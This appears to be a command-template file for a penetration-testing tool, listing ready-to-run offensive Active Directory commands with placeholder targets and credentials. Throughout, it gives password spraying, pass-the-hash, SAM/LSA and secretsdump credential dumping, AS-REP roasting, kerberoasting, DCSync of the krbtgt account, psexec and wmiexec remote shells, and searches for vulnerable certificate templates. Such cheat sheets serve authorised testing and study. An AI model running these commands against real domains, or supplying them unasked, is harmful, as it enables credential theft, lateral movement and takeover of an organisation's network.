# Active Directory. Filled from $DOMAIN/$DC/$U/$P/$RHOST — `adset`-free:
# the context bar shows what is loaded, and these show the real command, so
# what lands in the ledger is what you actually ran.

# nxc · null session, shares
nxc smb {{RHOST}} -u '' -p '' --shares

# nxc · guest session, shares
nxc smb {{RHOST}} -u guest -p '' --shares

# nxc · enumerate users by RID
nxc smb {{DC}} -u guest -p '' --rid-brute

# nxc · password policy (read this BEFORE spraying)
nxc smb {{DC}} -u {{U}} -p '{{P}}' --pass-pol

# nxc · spray one password across a user list (one password at a time, on purpose)
nxc smb {{DC}} -u users.txt -p '{{P}}' --continue-on-success

# nxc · authenticated share enumeration
nxc smb {{RHOST}} -u {{U}} -p '{{P}}' -d {{DOMAIN}} --shares

# nxc · pass-the-hash
nxc smb {{RHOST}} -u {{U}} -H {{HASH}} --local-auth

# nxc · dump SAM and LSA
nxc smb {{RHOST}} -u {{U}} -p '{{P}}' --sam --lsa

# kerbrute · validate users pre-auth (no lockout risk)
kerbrute userenum --dc {{DC}} -d {{DOMAIN}} users.txt

# impacket · AS-REP roast a user list, no creds needed
impacket-GetNPUsers {{DOMAIN}}/ -dc-ip {{DC}} -usersfile users.txt -no-pass -request -format hashcat -outputfile asrep.hash

# impacket · AS-REP roast with creds
impacket-GetNPUsers {{DOMAIN}}/{{U}}:'{{P}}' -dc-ip {{DC}} -request -format hashcat -outputfile asrep.hash

# impacket · kerberoast (SPN tickets)
impacket-GetUserSPNs {{DOMAIN}}/{{U}}:'{{P}}' -dc-ip {{DC}} -request -outputfile kerb.hash

# impacket · secretsdump
impacket-secretsdump {{DOMAIN}}/{{U}}:'{{P}}'@{{RHOST}}

# impacket · secretsdump with a hash
impacket-secretsdump -hashes :{{HASH}} {{DOMAIN}}/{{U}}@{{RHOST}}

# impacket · DCSync a single account
impacket-secretsdump {{DOMAIN}}/{{U}}:'{{P}}'@{{DC}} -just-dc-user krbtgt

# impacket · psexec shell
impacket-psexec {{DOMAIN}}/{{U}}:'{{P}}'@{{RHOST}}

# impacket · wmiexec (quieter than psexec)
impacket-wmiexec {{DOMAIN}}/{{U}}:'{{P}}'@{{RHOST}}

# impacket · ticket converter / kerberos auth
KRB5CCNAME={{U}}.ccache impacket-psexec -k -no-pass {{DOMAIN}}/{{U}}@{{RHOST}}

# bloodhound · collect everything
bloodhound-python -u {{U}} -p '{{P}}' -d {{DOMAIN}} -dc {{DOMAIN}} -ns {{DC}} -c all --zip

# ldapsearch · anonymous bind, naming contexts
ldapsearch -x -H ldap://{{DC}} -s base namingcontexts

# certipy · find vulnerable templates
certipy find -u {{U}}@{{DOMAIN}} -p '{{P}}' -dc-ip {{DC}} -vulnerable -stdout
